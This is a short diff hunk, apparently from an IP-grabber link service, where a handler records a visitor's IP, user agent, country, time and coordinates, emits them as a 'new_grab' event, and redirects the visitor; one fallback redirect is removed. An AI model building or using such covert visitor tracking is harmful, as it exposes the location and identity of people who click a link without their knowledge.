@@ -47,4 +47,3 @@ def first_grab(id):
         socket.emit("new_grab", {"ip": ip, "useragent": uagent, "country": country, "datetime": time, "lat": lat, "lon": lon})
 
         return redirect(redirect_url)
-    return redirect("https://yoink.rip")
